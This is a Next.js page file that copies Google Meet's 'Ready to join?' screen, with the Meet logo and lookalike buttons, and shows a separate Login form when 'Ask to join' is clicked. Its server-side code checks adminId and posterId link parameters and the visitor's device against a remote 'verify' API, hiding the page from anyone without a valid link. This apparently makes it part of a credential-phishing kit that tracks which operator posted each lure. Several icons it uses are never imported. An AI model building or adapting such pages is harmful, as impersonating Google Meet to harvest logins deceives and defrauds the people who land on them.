import { useState } from "react";
import Login from "../../../components/Login";
import Webcam from "react-webcam";
import { API_URL, site } from "../../../config";


export default function Home() {
  const [showForm, setShowForm] = useState(false);


  return (
    <>
    {
     !showForm ? (<div className="">
     <nav className="flex justify-between m-4">
     <img src='/images/google_meet_logo.svg' height={40} width={201}/>
    
     </nav>
     <div className="flex pt-[50px] pl-5">
       <div className=" relative w-[740px] h-[416px] bg-black outline-none rounded-md">
    
          <button className="bg-[#EA4335] text-white text-center w-[56px] h-[56px] absolute  bottom-[5%] left-[55%] rounded-full"><BsCameraVideoOff style={{display:"inline", fontSize:"30px", textAlign:"center"}}/></button>
          <button className="bg-[#EA4335] text-white text-center w-[56px] h-[56px] absolute  bottom-[5%] left-[45%] rounded-full"><FaMicrophoneSlash style={{display:"inline", fontSize:"30px", textAlign:"center"}}/></button>
       </div>
       <div className=" flex ml-[60px] flex-col justify-center items-center">
         <p className="text-2xl font-normal">Ready to join?</p>
         <div className="flex m-4">
           <button className="text-white text-sm bg-[#1A73E8] rounded-full px-5  py-3 mr-2" onClick={()=>setShowForm(true)}>Ask to join</button>
           <button className="text-[#1A73E8]  text-sm bg-[#E8F0FE] rounded-full px-6  py-3 "> <TbSquareArrowUp style={{display:"inline", fontSize:"20px", textAlign:"center"}}/><span className="pl-2 pt-2">Present</span></button>
         </div>
         <p className="text-sm pt-3">Other joining options</p>
         <p className="text-sm text-[#1A73E8] pt-5"><FaLaptopFile  style={{display:"inline", fontSize:"20px", textAlign:"center"}} /><span className="pl-2 ">Ask to use Companion mode</span></p>
       </div>
     </div>
    </div>):(<Login/>)
    }
    </>
  );


}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}